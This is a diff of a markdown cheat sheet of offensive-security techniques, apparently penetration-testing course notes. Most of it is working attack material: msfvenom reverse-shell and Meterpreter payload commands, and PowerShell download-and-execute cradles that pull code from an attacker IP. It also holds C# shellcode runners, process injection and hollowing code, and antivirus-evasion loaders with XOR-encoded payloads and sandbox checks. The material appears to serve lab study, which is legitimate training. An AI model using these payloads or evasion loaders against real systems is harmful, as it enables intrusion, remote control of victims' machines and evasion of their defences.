@@ -1,21 +1,27 @@
 # Client Side Code Execution With Office
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
+nc -nvlp 444
 ```
 
 ```bash
-nc -nvlp 444
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
+```
+
+## Meterpreter Handler
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
+```
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.49.52;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
 ```
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
-```
-
-```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
 ```
 
 ## HTML Smuggling
@@ -70,7 +76,7 @@ HTML5 anchor tag download attribute instructs the browser to automatically downl
 
 ## Phishing with Microsoft Office
 
-Save our document in a Macro-Enabled format such as .doc or .docm. The newer .docx will not store macros.
+Save our document in a Macro-Enabled format such as `.doc` or `.docm`. The newer `.docx` will not store macros.
 
 ```VB
 Sub Document_Open()
@@ -124,8 +130,10 @@ End Sub
 
 ## VBA Shellcode Runner
 
+Meterpreter Handler (x86)
+
 ```bash
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
 ```
 
 ```bash
@@ -170,10 +178,15 @@ End Sub
 ## Porting Shellcode Runner to PowerShell
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+```bat
+powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))
 ```
 
 ### run.txt
+
 ```pwsh
 $Kernel32 = @"
 using System;
@@ -220,6 +233,15 @@ End Sub
 ## Reflection Shellcode Runner in PowerShell
 
 ### run2.txt
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+```bat
+powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run2.txt'))
+```
+
 ```pwsh
 function LookupFunc {
 
@@ -271,9 +293,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 ## PowerShell Proxy-Aware Communication
 
-The proxy settings used by **Net.WebClient** are stored in the .**proxy** property and are populated from the **DefaultWebProxy** property when creating the object.
-
-View these settings using the **GetProxy** method by specifying the URL to test against.
+View the proxy settings using the **GetProxy** method by specifying the URL to test against.
 
 ```pwsh
 [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
@@ -287,7 +307,11 @@ $wc.proxy = $null
 $wc.DownloadString("http://192.168.119.120/run.ps1")
 ```
 
+In some environments, network communications not going through the proxy will get blocked at an edge firewall. Otherwise, we could bypass any monitoring that processes network traffic at the proxy.
+
 ## Fiddling With The User-Agent
+
+The Net.WebClient PowerShell download cradle does not have a default User-Agent set => the session will stand out from other legitimate traffic => Customize User-Agent
 
 ```pwsh
 $wc = new-object system.net.WebClient
@@ -296,7 +320,11 @@ $wc.DownloadString("http://192.168.119.120/run.ps1")
 ```
 
 ## Give Me A SYSTEM Proxy
+
 A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
+
+* -s: run it as SYSTEM
+* -i: make it interactive with the current desktop
 
 ```bat
 PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
@@ -311,9 +339,8 @@ When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped acco
 
 The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs.
 
-As part of our download cradle, use PowerShell to resolve a registry key. But the HKEY_USERS registry hive is not automatically mapped. 
-=>
-Map it with the **New-PSDrive** commandlet by specifying a name, the PSProvider as "Registry", and Root as "HKEY_USERS".
+As part of our download cradle, we can use PowerShell to resolve a registry key. But the HKEY_USERS registry hive is not automatically mapped. 
+=> Map the HKEY_USERS registry hive with the **New-PSDrive**
 
 The HKEY_USERS hive contains the hives of all users on the computer, including SYSTEM and other local service accounts, which we want to avoid.
 
@@ -335,11 +362,13 @@ $wc.DownloadString("http://192.168.119.120/run2.ps1")
 ```
 
 # Client Side Code Execution With Windows Script Host
-The default application for .js files is the Windows-Based Script Host
+
+The default application for `.js` files is the Windows-Based Script Host
 
 ## Jscript Meterpreter Dropper
 
 ### run.js
+
 ```js
 var url = "http://192.168.119.120/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
@@ -392,6 +421,32 @@ var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
 
 ## Shellcode Runner in C#
 
+Create a Kali Samba share for our code
+
+```bash
+sudo apt install samba
+sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
+sudo nano /etc/samba/smb.conf
+```
+
+`smb.conf`
+```
+[visualstudio]
+ path = /home/kali/data
+ browseable = yes
+ read only = no
+```
+
+```bash
+sudo smbpasswd -a kali
+
+sudo systemctl start smbd
+sudo systemctl start nmbd
+
+mkdir /home/kali/data
+chmod -R 777 /home/kali/data
+```
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -428,7 +483,95 @@ namespace ShellcodeRunner
 }
 ```
 
+### Shellcode Parameter
+
+Provide URL of the Meterpreter staged shellcode generated with msfvenom in csharp format
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace ShellcodeRunner
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            /*
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Please provide the URL as a command-line argument.");
+                return;
+            }
+
+            string url = args[0]; // Get the URL from command-line arguments
+            */
+
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        <input code here>
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
+        }
+    }
+}
+```
+
 ## Jscript Shellcode Runner
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -469,11 +612,16 @@ public class TestClass
     }
 }
 ```
+
 ```bat
 DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 ```
 
 ## SharpShooter
+
+SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code". SharpShooter is capable of evading various types of security software.
+
+`https://github.com/mdsecactivebreach/SharpShooter`
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o shell.txt
@@ -484,7 +632,7 @@ sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --outp
 ```
 
 ## Reflective Load
-### Class1.cs
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -523,9 +671,11 @@ namespace ReflectiveLoad
 ```
 
 ```pwsh
-# (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
-# $assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
+$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")
+```
 
+```pwsh
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
 
@@ -535,9 +685,13 @@ $method.Invoke(0, $null)
 ```
 
 # Process Injection and Migration
+
 ## Process Injection in C#
-Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, but there are a few others to consider.
+
+Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, ...
+
 ### VirtualAllocEx and WriteProcessMemory
+
 ```csharp
 using System;
 using System.Diagnostics;
@@ -583,7 +737,9 @@ namespace ProcessInjection
 ```
 
 The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
+
 ### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll
+
 ```csharp
 using System;
 using System.Diagnostics;
@@ -616,74 +772,8 @@ namespace ProcessInjection2
 
 		static void Main(string[] args)
         {
-			byte[] buf = new byte[809] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
-			0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
-			0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
-			0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
-			0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
-			0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
-			0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
-			0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
-			0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
-			0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,
-			0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
-			0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
-			0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
-			0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
-			0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
-			0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
-			0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
-			0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
-			0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
-			0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
-			0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
-			0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
-			0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
-			0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
-			0x2e,0x34,0x35,0x2e,0x31,0x39,0x39,0x00,0x5a,0x48,0x89,0xc1,
-			0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
-			0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
-			0x00,0xff,0xd5,0xe8,0xfe,0x00,0x00,0x00,0x2f,0x77,0x4e,0x75,
-			0x65,0x69,0x71,0x35,0x44,0x5a,0x30,0x55,0x44,0x52,0x67,0x4a,
-			0x45,0x5a,0x65,0x64,0x47,0x36,0x77,0x33,0x4c,0x48,0x4f,0x62,
-			0x61,0x4a,0x63,0x41,0x55,0x5a,0x64,0x44,0x7a,0x41,0x32,0x6f,
-			0x59,0x4b,0x49,0x58,0x7a,0x6f,0x42,0x48,0x61,0x48,0x59,0x6c,
-			0x70,0x44,0x30,0x63,0x72,0x75,0x78,0x78,0x45,0x36,0x54,0x62,
-			0x48,0x57,0x52,0x54,0x49,0x48,0x6e,0x73,0x55,0x30,0x56,0x78,
-			0x34,0x4c,0x4c,0x58,0x2d,0x6f,0x4c,0x46,0x77,0x48,0x49,0x5f,
-			0x62,0x48,0x44,0x50,0x30,0x38,0x4f,0x64,0x33,0x42,0x4f,0x54,
-			0x5f,0x38,0x70,0x63,0x36,0x78,0x4a,0x48,0x52,0x59,0x4c,0x43,
-			0x51,0x37,0x34,0x53,0x37,0x34,0x38,0x34,0x68,0x38,0x58,0x70,
-			0x57,0x58,0x4a,0x74,0x51,0x44,0x69,0x6e,0x52,0x74,0x4d,0x53,
-			0x61,0x61,0x6e,0x47,0x39,0x79,0x35,0x52,0x61,0x4b,0x65,0x31,
-			0x7a,0x58,0x37,0x61,0x49,0x72,0x4e,0x54,0x72,0x36,0x45,0x4b,
-			0x45,0x73,0x4b,0x78,0x39,0x38,0x75,0x49,0x61,0x52,0x4c,0x4f,
-			0x6a,0x37,0x70,0x45,0x62,0x2d,0x55,0x69,0x43,0x73,0x33,0x76,
-			0x47,0x44,0x64,0x46,0x59,0x67,0x55,0x37,0x66,0x71,0x34,0x30,
-			0x70,0x54,0x77,0x76,0x71,0x58,0x44,0x70,0x69,0x74,0x4f,0x66,
-			0x43,0x63,0x68,0x4f,0x67,0x5a,0x2d,0x59,0x45,0x42,0x54,0x76,
-			0x48,0x62,0x61,0x77,0x63,0x63,0x33,0x55,0x7a,0x70,0x7a,0x69,
-			0x69,0x79,0x48,0x57,0x30,0x4b,0x35,0x59,0x37,0x79,0x74,0x6f,
-			0x4d,0x42,0x74,0x38,0x62,0x78,0x77,0x64,0x4e,0x00,0x48,0x89,
-			0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
-			0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,
-			0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,
-			0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,
-			0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,
-			0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
-			0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,
-			0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,
-			0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,
-			0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,
-			0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
-			0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,
-			0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,
-			0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,
-			0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,
-			0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
-			0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,
-			0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,
-			0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};
+			// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
+            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};
 
 			uint buffer_size = (uint)buf.Length;
 
@@ -719,11 +809,20 @@ namespace ProcessInjection2
 		}
     }
 }
-
 ```
 
 ## Process Injection in PowerShell
+
 ### run3.txt
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+```bat
+powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run3.txt'))
+```
+
 ```pwsh
 function LookupFunc {
 
@@ -762,7 +861,7 @@ function getDelegateType {
 	return $type.CreateType()
 }
 
-$id = (Start-Process Notepad -passthru).ID
+$id = (Start-Process Notepad -passthru -WindowStyle hidden).ID
 
 $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x001F0FFF, $false, $id)
         
@@ -814,7 +913,6 @@ namespace DLLInjection
 
         static void Main(string[] args)
         {
-            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
             String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             String dllName = dir + "\\met.dll";
 
@@ -845,18 +943,13 @@ namespace DLLInjection
 ```pwsh
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
 $procid = (Get-Process -Name explorer).Id
-Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
-Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
-```
-
-```pwsh
-$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
-$procid = (Get-Process -Name explorer).Id
+# Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
 IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/Invoke-ReflectivePEInjection.ps1'))
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
 ## Process Hollowing in C#
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -974,6 +1067,8 @@ namespace ProcessHollowing
 
 # Antivirus Evasion
 
+Read the bytes of the executable, zero out the byte at offset 18867, and write the modified executable to a new file
+
 ```pwsh
 $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
 $bytes[18867] = 0
@@ -981,17 +1076,25 @@ $bytes[18867] = 0
 ```
 
 ## Bypassing Antivirus with Metasploit
+
 ```bash
 msfvenom --list encoders
-msfvenom --list encrypt
 ```
+
+The x86/shikata_ga_nai encoder is a commonly-used polymorphic encoder that produces different output each time it is run, making it effective for signature evasion. x64/zutto_dekiru encoder borrows many techniques from shikata_ga_nai.
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
+```
 
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
+```
+
+```bash
+msfvenom --list encrypt
 ```
 
 ```bash
@@ -1001,6 +1104,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 ## Bypassing Antivirus with C#
 
 ### Encrypt the shellcode
+
 ```csharp
 using System;
 using System.Text;
@@ -1031,7 +1135,90 @@ namespace Helper
         }
     }
 }
+```
 
+### helper.exe
+
+`helper.exe <Kali IP> <filename>`
+
+```csharp
+using System;
+using System.Text;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        byte[] encoded = new byte[buf.Length];
+                        for (int i = 0; i < buf.Length; i++)
+                        {
+                            //encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+                            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
+                        }
+
+                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
+                        //foreach (byte b in encoded)
+                        for (int i = 0; i < encoded.Length; i++)
+                        {
+                            if (i != encoded.Length - 1)
+                                hex.AppendFormat("0x{0:x2}, ", encoded[i]);
+                            else
+                                hex.AppendFormat("0x{0:x2}", encoded[i]);
+                        }
+                        Console.WriteLine("byte[] buf = new byte[" + buf.Length + "] {" + hex.ToString() + "};");
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
+        }
+    }
+}
 ```
 
 ```csharp
@@ -1102,6 +1289,331 @@ namespace BypassingAntivirus
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
             WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+
+### run.exe
+
+`run.exe <Kali IP> <filename>`
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace BypassingAntivirus
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr FlsAlloc(IntPtr callback);
+
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        DateTime t1 = DateTime.Now;
+                        Sleep(2000);
+                        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+                        if (t2 < 1.5)
+                        {
+                            return;
+                        }
+
+                        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+                        if (mem == null)
+                        {
+                            return;
+                        }
+
+                        IntPtr flsindex = FlsAlloc(IntPtr.Zero);
+                        if (flsindex == null)
+                        {
+                            return;
+                        }
+
+                        for (int i = 0; i < buf.Length; i++)
+                        {
+                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                        }
+
+                        int size = buf.Length;
+
+                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+                        Marshal.Copy(buf, 0, addr, size);
+
+                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+                        WaitForSingleObject(hThread, 0xFFFFFFFF);
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
+        }
+    }
+}
+```
+
+### hol.exe
+
+`hol.exe <Kali IP> <filename>`
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace BypassingAntivirus
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr FlsAlloc(IntPtr callback);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
+    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
